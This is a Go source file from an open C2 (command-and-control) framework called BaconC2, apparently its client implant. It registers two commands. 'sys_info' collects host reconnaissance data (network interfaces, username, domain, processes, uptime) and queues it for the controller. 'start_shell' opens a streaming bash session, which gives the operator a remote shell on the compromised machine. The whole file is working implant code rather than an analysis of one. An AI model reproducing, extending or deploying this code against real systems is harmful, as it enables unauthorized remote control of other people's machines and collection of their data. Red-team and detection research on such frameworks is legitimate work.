package commands

import (
	"fmt"
	"log"
	"sync"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/core/sysinfo"
	"github.com/RabbITCybErSeC/BaconC2/client/models"
	"github.com/RabbITCybErSeC/BaconC2/client/queue"
)

const (
	shellSessionTimeout = 30 * time.Second
)

func RegisterBuiltInCommands(registry *CommandHandlerRegistry, resultsQueue queue.IResultQueue, transport models.ITransportProtocol, streamingTransport models.IStreamingTransport) {
	registry.RegisterHandler("sys_info", func(cmd models.Command) models.CommandResult {
		return getInfoHandler(cmd, resultsQueue)
	})

	registry.RegisterHandler("start_shell", func(cmd models.Command) models.CommandResult {
		return startShellHandler(cmd, resultsQueue, streamingTransport)
	})
}

func getInfoHandler(cmd models.Command, resultsQueue queue.IResultQueue) models.CommandResult {
	sysInfo, err := sysinfo.GatherExtendedInfo()
	if err != nil {
		return models.CommandResult{
			ID:     cmd.ID,
			Status: "error",
			Output: map[string]string{"error": fmt.Sprintf("Failed to gather extended system info: %v", err)},
		}
	}

	output := map[string]interface{}{
		"network_interfaces": sysInfo.NetworkInterfaces,
		"architecture":       sysInfo.Architecture,
		"cpu_info":           sysInfo.CPUInfo,
		"memory_total":       sysInfo.MemoryTotal,
		"memory_free":        sysInfo.MemoryFree,
		"disk_total":         sysInfo.DiskTotal,
		"disk_free":          sysInfo.DiskFree,
		"uptime":             sysInfo.Uptime,
		"process_count":      sysInfo.ProcessCount,
		"username":           sysInfo.Username,
		"domain":             sysInfo.Domain,
		"last_boot_time":     sysInfo.LastBootTime,
	}

	result := models.CommandResult{
		ID:     cmd.ID,
		Status: "success",
		Output: output,
	}

	if err := resultsQueue.Add(result); err != nil {
		return models.CommandResult{
			ID:     cmd.ID,
			Status: "error",
			Output: map[string]string{"error": fmt.Sprintf("Failed to queue result: %v", err)},
		}
	}

	return result
}

func startShellHandler(cmd models.Command, resultsQueue queue.IResultQueue, streamingTransport models.IStreamingTransport) models.CommandResult {
	// Create default configuration
	config, err := models.NewStreamingConfig(models.ShellTypeBash, "xterm")
	if err != nil {
		log.Printf("Failed to create streaming config for command ID %s: %v", cmd.ID, err)
		return models.CommandResult{
			ID:     cmd.ID,
			Status: "error",
			Output: map[string]string{"error": fmt.Sprintf("Failed to create config: %v", err)},
		}
	}

	resultChan := make(chan models.CommandResult, 1)
	var wg sync.WaitGroup
	wg.Add(1)

	go func() {
		defer wg.Done()
		if err := streamingTransport.StartStreamingSession("shell", config, resultChan); err != nil {
			resultChan <- models.CommandResult{
				ID:     cmd.ID,
				Status: "error",
				Output: map[string]string{"error": fmt.Sprintf("Failed to start shell: %v", err)},
			}
		}
	}()

	// Wait for result or timeout
	select {
	case result := <-resultChan:
		wg.Wait() // Ensure goroutine completes
		if result.Status == "success" {
			if err := resultsQueue.Add(result); err != nil {
				log.Printf("Failed to queue shell result for command ID %s: %v", cmd.ID, err)
				return models.CommandResult{
					ID:     cmd.ID,
					Status: "error",
					Output: map[string]string{"error": fmt.Sprintf("Failed to queue result: %v", err)},
				}
			}
		}
		return result
	case <-time.After(shellSessionTimeout):
		log.Printf("Shell session timed out for command ID: %s", cmd.ID)
		streamingTransport.CloseSession("shell")
		wg.Wait() // Ensure goroutine completes before returning
		return models.CommandResult{
			ID:     cmd.ID,
			Status: "error",
			Output: map[string]string{"error": "Shell session timeout"},
		}
	}
}
